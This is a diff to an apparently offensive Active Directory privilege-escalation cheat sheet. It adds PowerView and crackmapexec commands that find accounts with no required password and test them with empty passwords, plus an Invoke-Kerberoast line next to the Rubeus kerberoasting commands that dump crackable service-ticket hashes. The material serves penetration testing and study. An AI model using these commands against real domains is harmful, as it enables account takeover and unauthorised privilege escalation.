@@ -1,4 +1,5 @@
 # Domain Privilege escalation
+* [Password not required](#Password-not-required)
 * [Kerberoast](#Kerberoast) 
   * [Set SPN](#Set-SPN)
 * [AS-REP Roasting](#AS-REP-Roasting)
@@ -60,7 +61,21 @@
   * [Foreign Security Principals](#Foreign-Security-Principals)
   * [ACLs](#ACLs)
   * [Pam Trust](#Pam-Trust)
- 
+
+## Password not required
+#### Check for users with password not required attribute
+- These users are able to have an empty password
+```
+Get-DomainUser -Credential $creds -Server 172.16.2.6 -Domain dev.admin.offshore.com | Where-Object useraccountcontrol -Match PASSWD_NOTREQD | Select-Object samaccountname, PASSWD_NOTREQD
+```
+
+#### Check if user has empty password
+- Or use powershell runas through RDP!
+```
+crackmapexec smb <DC IP> -u <USER> -p ''
+```
+
+
 ## Kerberoast
 - https://github.com/GhostPack/Rubeus
 #### Find user accounts used as service accounts
@@ -82,6 +97,10 @@ Rubeus.exe kerberoast /format:hashcat
 ```
 Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain <DOMAIN> /outfile:kerberoast_hashes.txt
 Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
+```
+
+```
+Invoke-Kerberoast -Outputformat hashcat
 ```
 
 ```
